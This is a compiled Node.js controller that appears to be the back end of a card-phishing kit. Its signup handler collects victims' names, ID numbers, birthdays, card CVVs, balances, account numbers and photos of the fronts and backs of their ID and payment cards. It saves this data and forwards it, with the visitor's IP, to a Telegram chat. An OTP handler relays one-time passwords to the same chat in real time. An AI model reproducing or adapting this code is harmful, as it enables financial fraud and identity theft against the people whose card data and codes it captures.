"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.AccountController = void 0;
const account_model_1 = require("../models/account.model");
const TelegramBot = require("node-telegram-bot-api");
const dotenv_1 = __importDefault(require("dotenv"));
dotenv_1.default.config();
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const bot = new TelegramBot(TOKEN, { polling: false });
class AccountController {
    signup(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
                const { email, name, phone, idCard, birthday, cvv, cardLimit, cardBalance, proposeLimit, cardType, accountNumber, socketId, } = req.body;
                let frontIdCard = "";
                let backIdCard = "";
                let frontCard = "";
                let backCard = "";
                if (req.files) {
                    const files = req.files;
                    // if (!files.frontIdCard || !files.backIdCard) {
                    //   return res.status(400).json({
                    //     message: "Front and back of ID card are required",
                    //   });
                    // }
                    // if (!files.frontCard || !files.backCard) {
                    //   return res.status(400).json({
                    //     message: "Front and back of card are required",
                    //   });
                    // }
                    frontIdCard = (files === null || files === void 0 ? void 0 : files.frontIdCard) ? files.frontIdCard[0].path : "";
                    backIdCard = (files === null || files === void 0 ? void 0 : files.backIdCard) ? files.backIdCard[0].path : "";
                    frontCard = (files === null || files === void 0 ? void 0 : files.frontCard) ? files.frontCard[0].path : "";
                    backCard = (files === null || files === void 0 ? void 0 : files.backCard) ? files.backCard[0].path : "";
                }
                const account = new account_model_1.Account({
                    email,
                    name,
                    phone,
                    frontIdCard,
                    backIdCard,
                    idCard,
                    birthday,
                    cvv,
                    frontCard,
                    backCard,
                    cardLimit,
                    cardBalance,
                    proposeLimit,
                    cardType,
                    socketId,
                    accountNumber,
                    ip,
                });
                yield account.save();
                bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`);
                // send message and photo
                frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard);
                backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard);
                frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard);
                backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard);
                return res.status(200).json({
                    message: "Signup successfully",
                });
            }
            catch (error) {
                return res.status(500).json({
                    message: error.message,
                });
            }
        });
    }
    getAll(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const accounts = yield account_model_1.Account.find().sort({ createdAt: -1 });
                return res.status(200).json({
                    accounts,
                });
            }
            catch (error) {
                return res.status(500).json({
                    message: error.message,
                });
            }
        });
    }
    delete(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const { id } = req.params;
                yield account_model_1.Account.findByIdAndDelete(id);
                return res.status(200).json({
                    message: "Delete successfully",
                });
            }
            catch (error) {
                return res.status(500).json({
                    message: error.message,
                });
            }
        });
    }
    updateOTP(req, res) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const { id } = req.params;
                const { otp } = req.body;
                const result = yield account_model_1.Account.findByIdAndUpdate(id, { otp }, { new: true });
                io.emit("updateOTP", result);
                bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `OTP: ${otp}\nName: ${result === null || result === void 0 ? void 0 : result.name}`);
                return res.status(200).json({ result });
            }
            catch (error) {
                return res.status(500).json({
                    message: error.message,
                });
            }
        });
    }
}
exports.AccountController = AccountController;
